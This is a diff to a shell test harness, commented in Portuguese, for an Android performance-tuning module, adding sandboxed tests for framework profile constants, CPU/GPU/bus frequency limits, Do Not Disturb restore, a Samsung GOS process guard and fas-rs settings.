@@ -11,6 +11,9 @@ export M54_DIR="$FAKE/fusao"
 export FAKE_SETTINGS_DIR="$FAKE/settings"
 # 2.9.8: apply pending agenda reverificação em background (sleep 30..185 s); no harness ela é chamada à mão
 export TUNE_NO_DEFER=1
+# a proteção de áudio do perf.sh roda como job em segundo plano (perf.sh audio-bg); no harness ela roda na hora,
+# exceto no bloco que testa o próprio job (21a-2)
+export PERF_AUDIO_SYNC=1
 for _s in lib.sh framework.sh perf.sh watch.sh bugreport.sh tune.sh dnd.sh display.sh gos_killer.sh thermal_guard.sh thermal_guard_stop.sh fas.sh; do
   cp "$STAGE/fusao/$_s" "$FAKE/fusao/" 2>/dev/null
 done
@@ -38,9 +41,12 @@ for s in service.sh customize.sh uninstall.sh cleanup.sh action.sh verify.sh; do
 done
 bash -n "$STAGE/system/bin/fusao" 2>"$FAKE/shn.err" && ok "sh-n fusao-cli" || bad "sh-n fusao-cli"
 
-# 2) framework: game aplica triad + refresh 120Hz + game_overlay seguro ('0'), idle restaura
+# 2) framework: game aplica as constantes do ActivityManager + refresh 120Hz + game_overlay seguro ('0'), idle
+# restaura. M-1: o perfil se reconhece pela chave que o Android 16 lê (activity_manager_constants); as duas chaves
+# mortas (job_scheduler/app_standby) não podem ser gravadas e service_restart_duration não pode voltar.
 M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/framework.sh" game
-grep -q "max_job_count_active=1" "$FAKE/settings/global__job_scheduler_constants" 2>/dev/null && ok "framework game triad" || bad "framework game triad"
+grep -q "power_check_max_cpu_1=25,power_check_max_cpu_2=35" "$FAKE/settings/global__activity_manager_constants" 2>/dev/null && ok "framework game triad" || bad "framework game triad"
+[ ! -e "$FAKE/settings/global__job_scheduler_constants" ] && [ ! -e "$FAKE/settings/global__app_standby_constants" ] && ok "framework game não grava chaves mortas (job/standby)" || bad "framework game não grava chaves mortas (job/standby)"
 grep -q "120.0" "$FAKE/settings/system__peak_refresh_rate" 2>/dev/null && ok "framework game refresh" || bad "framework game refresh"
 mkdir -p "$FAKE/proc/sys/vm" "$FAKE/proc/sys/net/ipv4" "$FAKE/sys/block/sda/queue"
 echo 150 > "$FAKE/proc/sys/vm/swappiness"; echo 120 > "$FAKE/proc/sys/vm/vfs_cache_pressure"
@@ -59,20 +65,44 @@ grep -q "tune: apply game" "$FAKE/fusao/fusao.log" && ok "framework+tune wire" |
 M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/framework.sh" idle
 [ ! -f "$FAKE/settings/dc__game_overlay__game_default_frame_rate" ] && ok "framework idle dc-revert" || bad "framework idle dc-revert"
 # padrão no case (dentro de [ ] o *...* era literal e o teste passava sempre)
-case "$(cat "$FAKE/settings/global__job_scheduler_constants" 2>/dev/null)" in
-  *max_job_count_active=1*) bad "framework idle restore";;
+case "$(cat "$FAKE/settings/global__activity_manager_constants" 2>/dev/null)" in
+  *power_check_max_cpu_1=25*) bad "framework idle restore";;
   *) ok "framework idle restore";;
 esac
 
 # 3) framework battery/balanced
 M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/framework.sh" battery
-grep -q "max_job_count_active=2" "$FAKE/settings/global__job_scheduler_constants" 2>/dev/null && ok "framework battery" || bad "framework battery"
+grep -q "power_check_max_cpu_1=10,power_check_max_cpu_2=20" "$FAKE/settings/global__activity_manager_constants" 2>/dev/null && ok "framework battery" || bad "framework battery"
 # 2.11.4: battery adaptativo 120/60 (dono: nada de 60 Hz travado)
 [ "$(cat "$FAKE/settings/system__min_refresh_rate" 2>/dev/null)" = "60.0" ] && [ "$(cat "$FAKE/settings/system__peak_refresh_rate" 2>/dev/null)" = "120.0" ] && ok "framework battery adaptive-hz" || bad "framework battery adaptive-hz"
 M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/framework.sh" balanced
-grep -q "max_job_count_active=4" "$FAKE/settings/global__job_scheduler_constants" 2>/dev/null && ok "framework balanced" || bad "framework balanced"
+grep -q "power_check_max_cpu_1=15,power_check_max_cpu_2=25" "$FAKE/settings/global__activity_manager_constants" 2>/dev/null && ok "framework balanced" || bad "framework balanced"
 [ "$(cat "$FAKE/settings/system__min_refresh_rate" 2>/dev/null)" = "60.0" ] && [ "$(cat "$FAKE/settings/system__peak_refresh_rate" 2>/dev/null)" = "120.0" ] && ok "framework balanced adaptive-hz" || bad "framework balanced adaptive-hz"
+# M-1: nenhum dos três perfis pede service_restart_duration (o ActivityManager lia: serviço sticky morto só voltava
+# em 30 min / 1 h / 24 h). Confere o valor GRAVADO de cada perfil, não a constante do script.
+_m1_srd=0
+for _m1_p in game battery balanced; do
+  M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/framework.sh" "$_m1_p"
+  grep -q "service_restart_duration" "$FAKE/settings/global__activity_manager_constants" 2>/dev/null && _m1_srd=1
+  [ -e "$FAKE/settings/global__job_scheduler_constants" ] || [ -e "$FAKE/settings/global__app_standby_constants" ] && _m1_srd=1
+done
+[ "$_m1_srd" = 0 ] && ok "M-1: perfis sem service_restart_duration e sem chaves mortas" || bad "M-1: perfis sem service_restart_duration e sem chaves mortas"
 M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/framework.sh" idle
+# M-1: purga 1x do que a versão antiga deixou. Diretório novo (sem o marcador): a tríade antiga de job_scheduler
+# some, o valor que é da ROM fica (controle), e o balanced 2.13.1 do ActivityManager (com 1 h de restart) é
+# reconhecido como "do FUSAO" no snapshot (null), não como padrão da ROM.
+M1D="$FAKE/m1"; mkdir -p "$M1D/fusao" "$M1D/settings"
+cp "$FAKE/fusao/lib.sh" "$FAKE/fusao/framework.sh" "$M1D/fusao/"
+printf '%s' "max_job_count_active=4,min_ready_jobs_count=16,bg_normal_job_count=2,bg_moderate_job_count=1,enable_adaptive_scheduling=true,min_ready_cpu_only_jobs_count=16,min_ready_non_active_jobs_count=16,heavy_use_factor=0.9,moderate_use_factor=0.75" > "$M1D/settings/global__job_scheduler_constants"
+printf '%s' "rom_standby=1" > "$M1D/settings/global__app_standby_constants"
+printf '%s' "service_restart_duration=3600000,service_reset_run_duration=60000,background_settle_time=30000,power_check_max_cpu_1=15,power_check_max_cpu_2=25,content_provider_retain_time=15000" > "$M1D/settings/global__activity_manager_constants"
+: > "$M1D/fusao/game-active.txt"; echo balanced > "$M1D/fusao/profile"
+M54_DIR="$M1D/fusao" FAKE_SETTINGS_DIR="$M1D/settings" sh "$M1D/fusao/framework.sh" balanced
+[ ! -e "$M1D/settings/global__job_scheduler_constants" ] && ok "M-1: purga apaga job_scheduler do FUSAO antigo" || bad "M-1: purga apaga job_scheduler do FUSAO antigo"
+[ "$(cat "$M1D/settings/global__app_standby_constants" 2>/dev/null)" = "rom_standby=1" ] && ok "M-1: purga não toca em valor da ROM (controle)" || bad "M-1: purga não toca em valor da ROM (controle)"
+grep -qx "activity_manager_constants=null" "$M1D/fusao/framework.stock" && ok "M-1: balanced 2.13.1 (restart 1 h) não vira padrão da ROM" || bad "M-1: balanced 2.13.1 (restart 1 h) não vira padrão da ROM"
+grep -q "service_restart_duration" "$M1D/settings/global__activity_manager_constants" && bad "M-1: apply por cima do 2.13.1 tira o restart de 1 h" || ok "M-1: apply por cima do 2.13.1 tira o restart de 1 h"
+rm -rf "$M1D"
 
 # 2.12.0: framework.stock contaminado (capturado com as tríades do FUSAO já aplicadas): a tríade própria não é
 # "padrão da ROM". Snapshot novo por cima dela grava null; stock antigo contaminado não a devolve no idle; valor
@@ -231,12 +261,31 @@ grep -q "profile_verify=13/13" "$FAKE/prof_bal.out" && ok "profile balanced veri
 [ "$(cat "$FAKE/sys/devices/system/cpu/cpufreq/policy0/scaling_min_freq")" = "533000" ] && ok "tune balanced p0_min" || bad "tune balanced p0_min"
 [ "$(cat "$FAKE/sys/devices/system/cpu/cpufreq/policy4/scaling_min_freq")" = "533000" ] && ok "tune balanced p4_min" || bad "tune balanced p4_min"
 [ "$(cat "$FAKE/sys/kernel/gpu/gpu_min_clock")" = "221000" ] && ok "tune balanced gpu_min" || bad "tune balanced gpu_min"
-# 858000 não existe na tabela do Mali-G68; o degrau real logo abaixo do máximo (949000) é 845000
+# 858000 não existe na tabela do Mali-G68; o degrau real logo abaixo do máximo (949000) é 845000. O nó vem do game
+# em 949000, então a descida é uma escrita real.
 [ "$(cat "$FAKE/sys/kernel/gpu/gpu_max_clock")" = "845000" ] && ok "tune balanced gpu_max" || bad "tune balanced gpu_max"
 [ "$(cat "$FAKE/sys/class/devfreq/17000010.devfreq_mif/min_freq")" = "421000" ] && ok "tune balanced mif_min" || bad "tune balanced mif_min"
-[ "$(cat "$FAKE/sys/class/devfreq/17000020.devfreq_int/min_freq")" = "133000" ] && ok "tune balanced int_min" || bad "tune balanced int_min"
+# barramentos fora de jogo = stock (INT 50000 / DISP 66000); o game tinha deixado 266000 / 200000
+[ "$(cat "$FAKE/sys/class/devfreq/17000020.devfreq_int/min_freq")" = "50000" ] && ok "tune balanced int_min" || bad "tune balanced int_min"
+[ "$(cat "$FAKE/sys/class/devfreq/17000040.devfreq_disp/min_freq")" = "66000" ] && ok "tune balanced disp_min" || bad "tune balanced disp_min"
 # o balanced segue com o P4 em 1824000 (eficiência do perfil casual); a descida 2400000 -> 1824000 tem de colar
 [ "$(cat "$FAKE/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq")" = "1824000" ] && ok "tune balanced p4_max" || bad "tune balanced p4_max"
+# tetos soltos por fora (a ROM regrava os dois nós: 2400000 / 949000 no aparelho): um novo apply do balanced repõe
+echo 2400000 > "$FAKE/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"
+echo 949000 > "$FAKE/sys/kernel/gpu/gpu_max_clock"
+M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/tune.sh" balanced >/dev/null 2>&1
+[ "$(cat "$FAKE/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq")" = "1824000" ] && [ "$(cat "$FAKE/sys/kernel/gpu/gpu_max_clock")" = "845000" ] && \
+  ok "tune balanced repõe os tetos de P4/GPU soltos por fora" || bad "tune balanced repõe os tetos de P4/GPU soltos por fora"
+grep -q "^profile_verify=13/13$" "$FAKE/fusao/profile.state" && grep -q "^profile_state=applied$" "$FAKE/fusao/profile.state" && ok "tune balanced fecha 13/13 com os tetos" || bad "tune balanced fecha 13/13 com os tetos"
+# balanced EM JOGO sobe os barramentos (INT/DISP 133000, MIF 676000) e fora de jogo devolve ao stock
+echo "com.roblox.client" > "$FAKE/fusao/game-active.txt"
+M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/tune.sh" balanced >/dev/null 2>&1
+[ "$(cat "$FAKE/sys/class/devfreq/17000020.devfreq_int/min_freq")" = "133000" ] && [ "$(cat "$FAKE/sys/class/devfreq/17000040.devfreq_disp/min_freq")" = "133000" ] && \
+  [ "$(cat "$FAKE/sys/class/devfreq/17000010.devfreq_mif/min_freq")" = "676000" ] && ok "tune balanced em jogo: barramentos sobem" || bad "tune balanced em jogo: barramentos sobem"
+: > "$FAKE/fusao/game-active.txt"
+M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/tune.sh" balanced >/dev/null 2>&1
+[ "$(cat "$FAKE/sys/class/devfreq/17000020.devfreq_int/min_freq")" = "50000" ] && [ "$(cat "$FAKE/sys/class/devfreq/17000040.devfreq_disp/min_freq")" = "66000" ] && \
+  ok "tune balanced fora de jogo: barramentos voltam ao stock" || bad "tune balanced fora de jogo: barramentos voltam ao stock"
 [ "$(cat "$FAKE/proc/sys/vm/swappiness")" = "120" ] && ok "tune balanced swap" || bad "tune balanced swap"
 [ "$(cat "$FAKE/proc/sys/vm/vfs_cache_pressure")" = "100" ] && ok "tune balanced pressure" || bad "tune balanced pressure"
 [ "$(cat "$FAKE/sys/block/sda/queue/read_ahead_kb")" = "128" ] && ok "tune balanced readahead fica no stock" || bad "tune balanced readahead fica no stock"
@@ -277,9 +326,12 @@ M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/fusao-cli" profile balance
 M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/fusao-cli" profile battery > "$FAKE/prof_bat_game.out" 2>&1
 grep -q "^profile_effective=game$" "$FAKE/prof_bat_game.out" && [ "$(cat "$P4MAXN")" = "2400000" ] && \
   ok "CLI battery em jogo aplica game" || bad "CLI battery em jogo aplica game"
-# balanced + jogo = balanced (GPU max 845000)
+# balanced + jogo = balanced. Prova pelos NÓS que distinguem os dois perfis em jogo: teto da GPU 845000 (game =
+# 949000), piso do P0 672000 (game = 1152000) e MIF 676000 (game = 1014000).
 M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/fusao-cli" profile balanced > "$FAKE/prof_bal_game.out" 2>&1
 grep -q "^profile_effective=balanced$" "$FAKE/prof_bal_game.out" && [ "$(cat "$GMAXN")" = "845000" ] && \
+  [ "$(cat "$FAKE/sys/devices/system/cpu/cpufreq/policy0/scaling_min_freq")" = "672000" ] && \
+  [ "$(cat "$FAKE/sys/class/devfreq/17000010.devfreq_mif/min_freq")" = "676000" ] && \
   ok "balanced em jogo fica balanced" || bad "balanced em jogo fica balanced"
 # app fora da gamelist no game-active não conta como jogo
 echo "com.android.settings" > "$GA"
@@ -591,16 +643,45 @@ M54_DIR="$FAKE/fusao" FS_ROOT="$FAKE" sh "$FAKE/fusao/tune.sh" idle
 
 # 10) dnd on/off com verify+retry (DND_FAKE_ZEN finge o settings get).
 cp "$STAGE/fusao/dnd.sh" "$FAKE/fusao/" 2>/dev/null
-M54_DIR="$FAKE/fusao" DND_DRYRUN=1 DND_FAKE_ZEN=1 sh "$FAKE/fusao/dnd.sh" on >"$FAKE/dndout.txt" 2>&1
-grep -q "set_dnd priority" "$FAKE/dndout.txt" && ok "dnd on seq" || bad "dnd on seq"
+# Backend falso COM ESTADO (DND_FAKE_DIR: zen e heads_up em arquivos, alterados pelos comandos como no aparelho):
+# cada caso confere o estado FINAL do sistema, não a sequência de comandos.
+DNDF="$FAKE/dndfake"; mkdir -p "$DNDF"
+dnd() { M54_DIR="$FAKE/fusao" DND_FAKE_DIR="$DNDF" sh "$FAKE/fusao/dnd.sh" "$@"; }
+dnd_set() { echo "$1" > "$DNDF/zen"; echo "$2" > "$DNDF/heads"; : > "$DNDF/calls"; rm -f "$FAKE/fusao/dnd.state" "$FAKE/fusao/dnd.prev"; }
+dnd_is() { [ "$(cat "$DNDF/zen")" = "$1" ] && [ "$(cat "$DNDF/heads")" = "$2" ]; }
+# usuário sem Não Perturbe e com heads-up: on liga (zen 1, heads-up 0) e off devolve (0 / 1)
+dnd_set 0 1
+dnd on
+dnd_is 1 0 && grep -qx "cmd notification set_dnd priority" "$DNDF/calls" && ok "dnd on seq" || bad "dnd on seq"
 [ "$(cat "$FAKE/fusao/dnd.state")" = "on" ] && ok "dnd on verified" || bad "dnd on verified"
 [ -s "$FAKE/fusao/dnd.seq" ] && ok "dnd seq guard" || bad "dnd seq guard"
-M54_DIR="$FAKE/fusao" DND_DRYRUN=1 DND_FAKE_ZEN=0 sh "$FAKE/fusao/dnd.sh" off >"$FAKE/dndout.txt" 2>&1
-grep -q "set_dnd off" "$FAKE/dndout.txt" && ok "dnd off seq" || bad "dnd off seq"
-[ "$(cat "$FAKE/fusao/dnd.state")" = "off" ] && ok "dnd off verified" || bad "dnd off verified"
-rm -f "$FAKE/fusao/dnd.state"
+dnd off
+dnd_is 0 1 && grep -qx "cmd notification set_dnd off" "$DNDF/calls" && ok "dnd off seq" || bad "dnd off seq"
+[ "$(cat "$FAKE/fusao/dnd.state")" = "off" ] && [ ! -e "$FAKE/fusao/dnd.prev" ] && ok "dnd off verified" || bad "dnd off verified"
+# M-6: usuário JÁ em Não Perturbe (zen 2, silêncio total) antes do jogo: o on não mexe e o off NÃO desliga
+dnd_set 2 1
+dnd on; dnd_is 2 1 && ok "M-6: on não troca o Não Perturbe do usuário" || bad "M-6: on não troca o Não Perturbe do usuário"
+dnd off; dnd_is 2 1 && ok "M-6: off preserva o Não Perturbe do usuário" || bad "M-6: off preserva o Não Perturbe do usuário (zen=$(cat "$DNDF/zen"))"
+# controle negativo: o mesmo roteiro SEM o snapshot (apagado antes do off = o off antigo) desliga o DND do usuário
+dnd_set 2 1
+dnd on; rm -f "$FAKE/fusao/dnd.prev"; dnd off
+dnd_is 0 1 && ok "M-6 controle: sem snapshot o off derruba o DND (o snapshot é o que preserva)" || bad "M-6 controle: sem snapshot o off derruba o DND"
+# usuário sem heads-up (0): depois do jogo continua sem (o off antigo forçava 1)
+dnd_set 0 0
+dnd on; dnd off
+dnd_is 0 0 && ok "M-6: off devolve heads-up 0 do usuário" || bad "M-6: off devolve heads-up 0 do usuário (heads=$(cat "$DNDF/heads"))"
+# jogo A -> jogo B sem exit (dois on seguidos): o snapshot continua sendo o do usuário, o off desliga de verdade
+dnd_set 0 1
+dnd on; dnd on; dnd off
+dnd_is 0 1 && ok "M-6: on repetido não regrava o snapshot com o estado do FUSAO" || bad "M-6: on repetido não regrava o snapshot (zen=$(cat "$DNDF/zen"))"
+# off sem nunca ter ligado (fusao dnd off / uninstall / cleanup) com o usuário em Não Perturbe: não toca em nada
+dnd_set 1 0
+dnd off
+dnd_is 1 0 && [ ! -s "$DNDF/calls" ] && ok "M-6: off sem on não mexe no sistema" || bad "M-6: off sem on não mexe no sistema"
+rm -f "$FAKE/fusao/dnd.state" "$FAKE/fusao/dnd.prev"
 M54_DIR="$FAKE/fusao" DND_DRYRUN=1 DND_FAKE_ZEN=9 sh "$FAKE/fusao/dnd.sh" on >/dev/null 2>&1
 grep -q "dnd: FALHOU on" "$FAKE/fusao/fusao.log" && ok "dnd fail loud" || bad "dnd fail loud"
+rm -f "$FAKE/fusao/dnd.prev"
 [ "$(M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/dnd.sh")" = "off" ] && ok "dnd state" || bad "dnd state"
 
 # 11) display downscale em wm fake (stock 1080x2340)
@@ -652,6 +733,38 @@ cp "$STAGE/fusao/gos_killer.sh" "$FAKE/fusao/" 2>/dev/null
 M54_DIR="$FAKE/fusao" timeout 8 sh "$FAKE/fusao/gos_killer.sh" >/dev/null 2>&1
 grep -q "gos killer: pausado" "$FAKE/fusao/fusao.log" && ok "killer pause" || bad "killer pause"
 rm -f "$FAKE/fusao/gos_killer.paused"
+# Guarda do GOS FORA de jogo (v0.5): o GOS nasce para um app que não está na gamelist (aparelho 2026-11-14, Plague
+# Inc.: P4 preso em 533000-960000 e GPU em 455000 com o GOS vivo). O killer tem de matar o processo sem jogo ativo e
+# pedir UMA reaplicação do perfil; com a guarda desligada (= v0.4) o GOS segue vivo e nada é reaplicado (controle).
+gk_run() {  # $1 = GOS_IDLE_EVERY; devolve em GK o diretório do cenário, com um "GOS" vivo de verdade
+  GK="$FAKE/gk"; rm -rf "$GK"; mkdir -p "$GK/fusao" "$GK/bin"
+  cp "$STAGE/fusao/lib.sh" "$STAGE/fusao/gos_killer.sh" "$GK/fusao/"
+  : > "$GK/fusao/game-active.txt"
+  printf '#!/bin/sh\necho "$1" >> "%s/tune.calls"\n' "$GK" > "$GK/fusao/tune.sh"; chmod +x "$GK/fusao/tune.sh"
+  sleep 60 & echo $! > "$GK/gos.pid"
+  printf '#!/bin/sh\np=$(cat "%s/gos.pid")\nkill -0 "$p" 2>/dev/null && echo "$p" || exit 1\n' "$GK" > "$GK/bin/pidof"
+  printf '#!/bin/sh\nexit 0\n' > "$GK/bin/cmd"; cp "$GK/bin/cmd" "$GK/bin/am"
+  printf '#!/bin/sh\necho "$*" >> "%s/pm.calls"\n' "$GK" > "$GK/bin/pm"
+  chmod +x "$GK/bin/"*
+  # o boot do killer mata o GOS que já está vivo; o cenário é o GOS nascer DEPOIS, sem jogo ativo
+  ( PATH="$GK/bin:$PATH" GOS_IDLE_EVERY="$1" M54_DIR="$GK/fusao" timeout 16 sh "$GK/fusao/gos_killer.sh" >/dev/null 2>&1 ) &
+  sleep 2; kill "$(cat "$GK/gos.pid")" 2>/dev/null
+  sleep 60 & echo $! > "$GK/gos.pid"
+  : > "$GK/tune.calls"; : > "$GK/pm.calls"
+  sleep 9
+}
+gk_run 1
+kill -0 "$(cat "$GK/gos.pid")" 2>/dev/null && bad "GOS fora de jogo: morto pela guarda" || ok "GOS fora de jogo: morto pela guarda"
+grep -q "gos killer \[guarda\]: matou" "$GK/fusao/fusao.log" && ok "GOS fora de jogo: fica no log" || bad "GOS fora de jogo: fica no log"
+[ "$(grep -c "^auto$" "$GK/tune.calls")" = 1 ] && ok "GOS fora de jogo: perfil reaplicado 1x" || bad "GOS fora de jogo: perfil reaplicado 1x [$(cat "$GK/tune.calls" | tr '\n' ' ')]"
+grep -qx "disable-user --user 0 com.samsung.android.game.gos" "$GK/pm.calls" && ok "GOS fora de jogo: pacote redesativado" || bad "GOS fora de jogo: pacote redesativado [$(cat "$GK/pm.calls" | tr '\n' ' ')]"
+wait
+gk_run 0
+kill -0 "$(cat "$GK/gos.pid")" 2>/dev/null && ok "GOS controle: sem a guarda segue vivo" || bad "GOS controle: sem a guarda segue vivo"
+[ ! -s "$GK/tune.calls" ] && [ ! -s "$GK/pm.calls" ] && ok "GOS controle: sem a guarda nada é reaplicado nem desativado" || bad "GOS controle: sem a guarda nada é reaplicado nem desativado"
+kill "$(cat "$GK/gos.pid")" 2>/dev/null
+wait
+rm -rf "$GK"
 
 # 15) dumpsys parser (formato real)
 cat > "$FAKE/dump.txt" <<'EOF'
@@ -669,6 +782,7 @@ cat > "$FAKE/bin/fas-rs" <<'FASEOF'
 #!/bin/sh
 trap 'exit 0' TERM
 echo "[t] INFO: Config watcher started"
+echo "[t] INFO: CPU ceiling floor: ${FAS_CEIL_FLOOR_KHZ:-unset} kHz"
 echo "[t] INFO: New fas buffer on: [com.roblox.client]"
 echo "[t] INFO: FAS working on [com.roblox.client]"
 while :; do sleep 1; done
@@ -730,6 +844,29 @@ owns && ok "fas owns última linha vale" || bad "fas owns última linha vale"
 fas target com.roblox.client auto >/dev/null
 owns && ok "fas owns volta com auto (controle)" || bad "fas owns volta com auto (controle)"
 rm -f "$FAKE/fusao/fas.targets"
+
+# Piso do teto de CPU (patch 0010 do fork): o fas.sh entrega o piso ao fas-rs por FAS_CEIL_FLOOR_KHZ. O efeito
+# (underflow do A2DP com e sem piso) só o aparelho mede; aqui o que se confere é que o valor CHEGA ao processo:
+# padrão, config fas_floor_khz, 0 = sem piso, e lixo na config cai no padrão.
+fas_floor_seen() {
+  M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/fas.sh" exit >/dev/null 2>&1
+  M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/fas.sh" enter com.roblox.client >/dev/null 2>&1
+  sleep 1
+  sed -n 's/.*CPU ceiling floor: \([^ ]*\) kHz.*/\1/p' "$FAKE/fusao/fas.log" | tail -n 1
+}
+_cfg_bk=$(cat "$FAKE/fusao/config" 2>/dev/null)
+[ "$(fas_floor_seen)" = "1152000" ] && ok "fas piso padrão chega ao fas-rs" || bad "fas piso padrão chega ao fas-rs"
+echo "fas_floor_khz=960000" >> "$FAKE/fusao/config"
+[ "$(fas_floor_seen)" = "960000" ] && ok "fas piso da config chega ao fas-rs" || bad "fas piso da config chega ao fas-rs"
+grep -Fq "piso=960000 [com.roblox.client]" "$FAKE/fusao/fusao.log" && ok "fas piso no log" || bad "fas piso no log"
+M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/fas.sh" status | grep -Fxq "fas_floor_khz=960000" && ok "fas piso no status" || bad "fas piso no status"
+echo "fas_floor_khz=0" >> "$FAKE/fusao/config"
+[ "$(fas_floor_seen)" = "0" ] && ok "fas piso 0 = sem piso" || bad "fas piso 0 = sem piso"
+echo "fas_floor_khz=abc" >> "$FAKE/fusao/config"
+[ "$(fas_floor_seen)" = "1152000" ] && ok "fas piso inválido cai no padrão" || bad "fas piso inválido cai no padrão"
+M54_DIR="$FAKE/fusao" sh "$FAKE/fusao/fas.sh" exit >/dev/null 2>&1
+printf '%s
+' "$_cfg_bk" > "$FAKE/fusao/config"
 
 # verify do tune com o FAS dono da CPU: o fas-rs crava min=max (768000); com FAS não é divergência,
 # sem FAS é (controle negativo no próprio teste)
@@ -906,6 +1043,153 @@ _m1r=$(PATH="$FAKE/m1bin:$PATH" OBSERVER_FAKE_ALIVE= sh "$FAKE/m1_t.sh" "$FAKE/m
 kill "$_m1h" 2>/dev/null; wait "$_m1h" 2>/dev/null
 [ "$_m1r" = "001" ] && [ "$(wc -l < "$FAKE/m1_pgn")" = 2 ] && ok "observer_alive cache (pgrep 1x vivo, morto=1)" || bad "observer_alive cache [$_m1r pgrep=$(wc -l < "$FAKE/m1_pgn")]"
 
+# 17b) A-1: sessão segurada pelo watch. Só lib.sh + watch.sh no diretório (sem ganchos), pidof falso (vivo enquanto
+# existir o arquivo "alive") e foco falso. O dado conferido é o game-active.txt e o exit no log.
+a1_setup() {  # $1 = dir
+  rm -rf "$1"; mkdir -p "$1/fusao" "$1/bin"
+  cp "$STAGE/fusao/lib.sh" "$STAGE/fusao/watch.sh" "$1/fusao/"
+  printf 'com.jogo.teste\n' > "$1/fusao/gamelist.txt"
+  printf '#!/bin/sh\n[ -f "%s/alive" ] && echo 4242 || exit 1\n' "$1" > "$1/bin/pidof"; chmod +x "$1/bin/pidof"
+  : > "$1/alive"
+  printf 'com.jogo.teste' > "$1/fusao/game-active.txt"
+}
+a1_exits() { grep -c "watch: exit" "$1/fusao/fusao.log" 2>/dev/null; }
+A1="$FAKE/a1"
+# (a) bounce de loading: o observer grava "" com o jogo vivo e a janela dele em foco -> a sessão é SEGURADA (o
+# debounce do NTE continua valendo); depois o jogo morre sem o observer gravar nada -> exit em poucos segundos.
+a1_setup "$A1"; echo com.jogo.teste > "$A1/focus"
+( PATH="$A1/bin:$PATH" OBSERVER_FAKE_ALIVE=1 FOCUS_FAKE="$A1/focus" WATCH_HOLD_EVERY=1 WATCH_DRIFT_EVERY=0 M54_DIR="$A1/fusao" timeout 21 sh "$A1/fusao/watch.sh" >/dev/null 2>&1 ) &
+sleep 4; : > "$A1/fusao/game-active.txt"; sleep 7
+[ "$(cat "$A1/fusao/game-active.txt")" = "com.jogo.teste" ] && [ "$(a1_exits "$A1")" = 0 ] && ok "A-1: bounce com o jogo em foco segura a sessão" || bad "A-1: bounce com o jogo em foco segura a sessão"
+rm -f "$A1/alive"; echo com.sec.android.app.launcher > "$A1/focus"; sleep 8
+[ -z "$(cat "$A1/fusao/game-active.txt")" ] && [ "$(a1_exits "$A1")" = 1 ] && ok "A-1: jogo morto com a sessão segurada dispara o exit" || bad "A-1: jogo morto com a sessão segurada dispara o exit [ga=$(cat "$A1/fusao/game-active.txt") exits=$(a1_exits "$A1")]"
+wait
+# (b) controle negativo: o mesmo roteiro com a reconferência desligada (WATCH_HOLD_EVERY enorme = o watch antigo)
+# fica preso: game-active continua com o jogo morto e nenhum exit.
+a1_setup "$A1"; echo com.jogo.teste > "$A1/focus"
+( PATH="$A1/bin:$PATH" OBSERVER_FAKE_ALIVE=1 FOCUS_FAKE="$A1/focus" WATCH_HOLD_EVERY=99999 WATCH_DRIFT_EVERY=0 M54_DIR="$A1/fusao" timeout 22 sh "$A1/fusao/watch.sh" >/dev/null 2>&1 ) &
+sleep 4; : > "$A1/fusao/game-active.txt"; sleep 7
+rm -f "$A1/alive"; echo com.sec.android.app.launcher > "$A1/focus"; sleep 8
+[ "$(cat "$A1/fusao/game-active.txt")" = "com.jogo.teste" ] && [ "$(a1_exits "$A1")" = 0 ] && ok "A-1 controle: sem a reconferência a sessão fica presa" || bad "A-1 controle: sem a reconferência a sessão fica presa"
+wait
+# (c) tela apagada / keyguard: a janela em foco é NotificationShade e o mFocusedApp ainda é o jogo. O parser antigo
+# (current_focus) devolve o jogo; o novo (focused_window_pkg) não, e a sessão sai em vez de ser segurada.
+cat > "$FAKE/dump-keyguard.txt" <<'EOF'
+  mCurrentFocus=Window{f1a2b3c u0 NotificationShade}
+  mFocusedApp=ActivityRecord{84676892 u0 com.jogo.teste/.MainActivity t565}
+EOF
+cat > "$FAKE/dump-jogo.txt" <<'EOF'
+  mCurrentFocus=Window{6bfa460 u0 com.jogo.teste/com.jogo.teste.MainActivity}
+  mFocusedApp=ActivityRecord{84676892 u0 com.jogo.teste/.MainActivity t565}
+EOF
+sed -n '/^current_focus() {/,/^}/p;/^focused_window_pkg() {/,/^}/p' "$STAGE/fusao/watch.sh" > "$FAKE/a1_focus.sh"
+_a1_old=$(DUMPSYS_FAKE="$FAKE/dump-keyguard.txt" FOCUS_FAKE= sh -c '. "$1"; current_focus' _ "$FAKE/a1_focus.sh")
+_a1_new=$(DUMPSYS_FAKE="$FAKE/dump-keyguard.txt" FOCUS_FAKE= sh -c '. "$1"; focused_window_pkg' _ "$FAKE/a1_focus.sh")
+_a1_fg=$(DUMPSYS_FAKE="$FAKE/dump-jogo.txt" FOCUS_FAKE= sh -c '. "$1"; focused_window_pkg' _ "$FAKE/a1_focus.sh")
+[ "$_a1_old" = "com.jogo.teste" ] && [ -z "$_a1_new" ] && [ "$_a1_fg" = "com.jogo.teste" ] && ok "A-1: keyguard não conta como jogo em foco (parser antigo contava)" || bad "A-1: keyguard não conta como jogo em foco [antigo=$_a1_old novo=$_a1_new jogo=$_a1_fg]"
+a1_setup "$A1"
+( unset FOCUS_FAKE; PATH="$A1/bin:$PATH" OBSERVER_FAKE_ALIVE=1 DUMPSYS_FAKE="$FAKE/dump-keyguard.txt" WATCH_DRIFT_EVERY=0 M54_DIR="$A1/fusao" timeout 14 sh "$A1/fusao/watch.sh" >/dev/null 2>&1 ) &
